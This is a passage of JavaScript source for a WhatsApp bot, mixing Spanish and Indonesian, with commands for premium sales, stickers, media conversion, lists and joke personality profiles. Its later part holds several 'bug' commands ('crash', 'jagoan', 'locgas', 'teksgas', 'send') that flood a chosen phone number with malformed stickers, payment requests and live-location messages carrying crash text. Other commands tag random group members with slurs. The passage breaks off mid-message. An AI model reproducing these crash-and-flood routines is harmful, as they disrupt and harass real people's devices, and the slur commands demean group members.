reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paquete :* 20K • Sewabot 1 Mes
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Año'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paquete:* 35K • Sewabot 1 Año
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanente'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paquete:* 45K • Sewabot Permanente
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'premkay':
if ((args[0]) == '1Semana'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 10K • Premium 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Mes'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 20K • Premium 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Año'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 35K • Premium 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanente'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 45K • Premium Permanente
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'botkay':
if ((args[0]) == '1Semana'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 10K • Jadibot 1 Semana
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Mes'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 20K • Jadibot 1 Mes
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Año'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 35K • Jadibot 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanente'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 45K • Jadibot Permanente
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'ownkay':
if ((args[0]) == '1Semana'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 10K • Jadi Owner 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Mes'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 20K • Jadi Owner 1 Mes
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1Año'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 35K • Jadi Owner 1 Año
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == 'permanente'){
reply(`Su pedido está siendo procesado por un bot, espere más tarde en el propietario del chat para la confirmación`)
Panda.sendMessage(creator,{text:`*❏ ORDEN ❏*
📮 : *Paket:* 45K • Jadi Owner Permanente
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'addprem':
if (!itsMePanda) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} Numero\nContacto${prefix+command} 6287705048235`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Panda.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Ahora ${prrkek} eres un usuario premium!`)
break
case 'delprem':
if (!itsMePanda) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} Numero\nContaco ${prefix+command} 56921700706`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Ahora ${ya} As dejado de ser premium!`)
break
case 'addvn':{
if (!itsMePanda) return reply(mess.owner)
if (args.length < 1) return reply('como se llama el audio')
if (vnnye.includes(q)) return reply("El nombre ya está en uso.")
let delb = await Panda.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Éxito al agregar audio\nCompruebe el método ${prefix}listvn`)
}
break
case 'delvn':{
if (!itsMePanda) return reply(mess.owner)
if (args.length < 1) return reply('Introducir consultas')
if (!vnnye.includes(q)) return reply("El nombre no existe en la base de datos.")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Éxito al eliminar vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *LISTa VN* 」\n│\n'
for (let x of vnnye) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
reply(teks)
}
break
case 'addowner':
if (!itsMePanda) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} numero\nComando ${prefix+command} 56921700706`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Panda.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Ingresa un número válido y registrado en WhatsApp!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (!itsMePanda) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} Numero\nComando ${prefix+command} 56921700706`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Numero ${ya} Ha sido borrado por el dueño!!`)
break
case 'listpremium':
teks = '*Lista Premium*\n\n'
for (let Panda of prem) {
teks += `- ${Panda}\n`
}
teks += `\n*Total : ${prem.length}*`
Panda.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setppbot': {
if (!itsMePanda) return reply(mess.owner)
if (!quoted) return reply(`Enviar/Responder imagen con título ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Enviar/Responder imagen con título ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Enviar/Responder imagen con título ${prefix + command}`)
var medis = await Panda.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
var { img } = await generateProfilePicture(medis)
await Panda.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Realizado`)
} else {
var memeg = await Panda.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Realizado`)
}
}
break
case 'listnya':
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`No hay ningún mensaje de lista en la base de datos todavía`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`No hay mensajes listados en este grupo todavía`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessageNya = {
text: `Hola ${pushname}\n\nAquí hay una lista de elementos\n¡Por favor, elija uno!\n${tanggal(new Date())}\n🕰 Horas : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
footer: "Lista By Panda",
buttonText: "Click Here",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsge = await Panda.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!itsMePanda) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return reply(`Usar de una manera ${prefix+command.slice(0)} *Nombre Artículo@Intem*\n\n_Comando_\n\n${prefix+command.slice(0)} Nombrelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`Lista de respuestas con clave: *${args1}* ya en este grupo.`)
if (/image/.test(mime)) {
media = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case 'dellist':
if (!itsMePanda) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'updatelist':
if (!itsMePanda) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'snobg': {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 segundos`)
if (/image/.test(mime)) {
let media = await Panda.downloadAndSaveMediaMessage(quoted)
let encmedia = await Panda.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Panda.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tourl':
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
mee = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
Panda.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'gay':
case 'jail':
try {
if (!isPrem) return replyprem(mess.premium)
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
reply(mess.wait)
meeh = await Panda.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
Panda.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'tovn':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
mee = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
Panda.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
mee = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
Panda.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
mee = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
Panda.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
break
case 'smeme':
if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (isImage) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
reply(mess.wait)
mee = await Panda.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
Panda.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break
case 'cekme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
					var hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget kek mimin😍','❌','✔️']
					var wetak= ['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡════《 Cek Sifat @${bet.split('@')[0]} 》════≡*

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%

*≡═════《 CEKSIFATME 》═════≡*`
					buff = await getBuffer(ppuser)
Panda.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${prefix+command}*`)
let media = await Panda.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Panda.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hola ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB',
"sourceUrl": 'https://chat.whatsapp.com/BivWkRVQJSYHAmQXkIDxnB'
}}
}, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'sticker': 
case 's': {
if (!quoted) return reply(`Enviar/Responder Imágenes/Videos/Gifs con Título ${prefix+command}\nduracion minima 1-6 Segundos`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Panda.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply(`Enviar/Responder Imágenes/Videos/Gifs con Título ${prefix+command}\nDuracion minima 1-6 Segundos`)
let media = await quoted.download()
let encmedia = await Panda.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Enviar/Responder Imágenes/Videos/Gifs con Título ${prefix+command}\nDuracion minima 1-6 Segundos`)
}
}
break
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'peak':
case 'pantex':
case 'pantek':
case 'setan':
case 'iblis':
case 'cacat':
case 'yatim':
case 'piatu':
{
if (!m.isGroup) return reply(mess.group)
let member = participants.map((u) => u.id)
let org = member[Math.floor(Math.random() * member.length)]
Panda.sendMessage(from, { text: `${command} Aqui estan @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
}
break
case 'nivelgay':

if (!m.isGroup) return reply(mess.group)
const cex = body.slice(0)
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Panda.sendMessage(from, { text: 'Pregunta : *' + cex + '*\nNumero : ' + `@${mentionByReply.split('@')[0]}` + '\nPorcentaje ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
Panda.sendMessage(from, { text: 'Pregunta : *' + cex + '*\nNumero :' + `@${mentionByReply.split('@')[0]}` + '\nPorcentaje : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
Panda.sendMessage(from, { text: 'Pregunta : *' + cex + '*\nNumero :' + `@${mentionByReply.split('@')[0]}` + '\nPorcentaje : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'cekbapak':
if (!m.isGroup) return reply(mess.group)
const cek = bapak[Math.floor(Math.random() * bapak.length)]
reply(cek)
break
case 'obfus':{
if (!q) return reply(`Contoh ${prefix+command} 
const kirbotz = require('kirbotz-api')`)
let meg = await obfus(q)
reply(`Sukses
${meg.result}`)
}
break
case 'styletext':{
if (!q) return reply(`Contoh ${prefix+command} akira`)
reply(mess.wait)
let res = await styletext(q)
reply(util.format(res))
}
break
case 'vote': {
if (!itsMePanda) return reply(mess.owner)
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO SAYA Panda BOT",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI Panda BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: crsh })
Panda.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
reply(mess.succes)
}
break
case 'send':{
if (!q) return reply(`Penggunaan ${prefix+command} 6285842107854`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'crash':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 56921700706`)
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
Panda.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'jagoan' : {
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
Panda.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku Panda', 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `Panda Bot ${virus}${virtex(prefix)}`,
"body": `Panda Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Panda Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyauser, 
thumbnail: ppnyauser,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'jagoanneon' : {
if (!itsMePanda) return reply(mess.owner)
Panda.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `Panda Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `Panda Bot`,
"body": `Masih Bawahan`,
mimetype: 'audio/mpeg', 
caption: `Panda Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyauser, 
thumbnail: ppnyauser,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'locgas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: Panda.waUploadToServer })
var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `Panda Bot ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `Panda Bot ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
Panda.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'teksgas':{
if (!itsMePanda) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
Panda.relayMessage(num, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
